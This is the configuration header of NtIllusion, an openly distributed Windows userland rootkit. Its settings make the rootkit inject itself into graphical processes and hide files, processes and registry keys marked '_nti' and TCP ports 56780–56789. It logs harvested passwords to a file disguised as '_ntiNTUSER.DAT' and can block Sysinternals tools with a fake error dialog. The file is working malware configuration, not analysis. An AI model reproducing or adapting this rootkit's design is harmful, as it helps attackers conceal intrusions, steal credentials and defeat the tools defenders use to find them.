/******************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#ifndef _KNTICONFIG_H
#define _KNTICONFIG_H

// o Config o
#define NTILLUSION_VERSION		"1.0"

#define SPREAD_ACROSS_USERLAND	1		//	If marked as 1, the rootkit will use the hook to be injected into all
										//	graphic processes
#define WriteFile_FPORT_ONLY	1		//	If marked as 1, the rootkit will only hijack WriteFile in fport.exe

// oo Info oo 
#define VERBOSE_TURN_ALL_OFF	0		//	If marked as 1, the rootkit won't send anything to the debugger
#define VERBOSE_HIJACK_RESULT	0		//	If marked as 1, the rootkit sends the result of the hijack (successfull or not) for the APIs
#define VERBOSE_API_LIST		0		//	If marked as 1, the rootkit will list all Dlls of the process being hijacked
#define VERBOSE_DIR_LIST		1		//	If marked as 1, the rootkit will send to debugger all files when a process uses FindFirst/NextFileA/W
#define VERBOSE_STEALTH			0		//	If marked as 1, the rootkit will tell what he hides
#define VERBOSE_ERRORS			0		//	If marked as 1, the rootkit will tell errors


//	oo Hide Masks oo
// All these strings MUST be in *LOWER CASE*
#define RTK_FILE_CHAR "_nti"			//	Files whose name is starting by RTK_FILE_CHAR characters will be marked as hidden
#define RTK_PROCESS_CHAR RTK_FILE_CHAR	//	Processes whose name is starting by RTK_PROCESS_CHAR characters will be marked as hidden
#define RTK_REG_CHAR RTK_FILE_CHAR		//	Registry keys whose name is starting by RTK_REG_CHAR characters will be marked as hidden
//	Tcp ports : All ports in range from RTK_PORT_HIDE_MIN to RTK_PORT_HIDE_MAX will be hidden
//  This will hide range from 56780 to 56789 :
#define RTK_PORT_HIDE_MIN  56780		// range lowest number		(for AllocAndGetTCPExTableFromStack)
#define RTK_PORT_HIDE_MAX  56789		// range highest number		(for AllocAndGetTCPExTableFromStack)
#define	RTK_PORT_HIDE_STR "5678"		// all common digits to every ports in range	(for netstat)
/*  Example : If you want to hide range from 12340 to 12349, fill defines as this:
#define RTK_PORT_HIDE_MIN  12340		// range lowest number		(for AllocAndGetTCPExTableFromStack)
#define RTK_PORT_HIDE_MAX  12349		// range highest number		(for AllocAndGetTCPExTableFromStack)
#define	RTK_PORT_HIDE_STR "1234"		// all common digits to every ports in range	(for netstat)
*/

//	oo Security oo
#define NTILLUSION_PASSLOG_FILE "_ntiNTUSER.DAT"	// This will contain rootkit's output & passwords grabbed
//#define NTI_SECURE_LOGFILE						// Uncomment this line if you want a crypted password log file
#ifdef NTILLUSION_PASSLOG_FILE
	#define NTI_SECURE_LOGKEY	'®'					// The key of the logfile (one char xor) : poor encoding but it won't reveal its content to the 1st passerby
#endif

//	oo	Config oo
// All these strings MUST be in *LOWER CASE*
#define NTILLUSION_TARGET_REGEDIT	"regedit.exe"	// registry tool
#define NTILLUSION_TARGET_EXPLORER	"explorer.exe"	// windows gui
#define NTILLUSION_TARGET_TASKMAN	"taskmgr.exe"	// process manager
#define NTILLUSION_TARGET_FPORT		"fport.exe"		// fport (nestat like)
// The two following process will not be loaded to prevent rootkit revelation if you let the
// 1st following line uncommented
//#define NTILLUSION_DISABLE_SYSINT_TOOLS
#ifdef NTILLUSION_DISABLE_SYSINT_TOOLS
	#define NTILLUSION_DISBL_TCPVIEW	"tcpview.exe"	// tcp view (nestat like)
	#define NTILLUSION_DISBL_PROCEXP	"procexp.exe"	// process explorer (taskmgr like)
	// fake error message :
	#define NTILLUSION_DISBL_MSG "Instruction at \"0xff00ff6a\" cannot be read.\n Press OK to exit program."
	#define NTILLUSION_DISBL_TITLE "Sysinternals Error"		// message box title for the fake error
#endif

#define LOADER_NAME "kntillusionloader.exe"			// rootkit loader
#define RTK_REVEAL_STRING "ntillusionownzyourbox?"	// triggers the display of a message (easter egg)
#define NTILLUSION_PROCESS_NOTFOUND "<unknown>"		// for internal use, set to whatever you want

// Some flags
#define NTI_ON_ROOTKIT_LOAD	1
#define NTI_ON_NEW_DLL		0

#define NTI_SIGNATURE		31337

#endif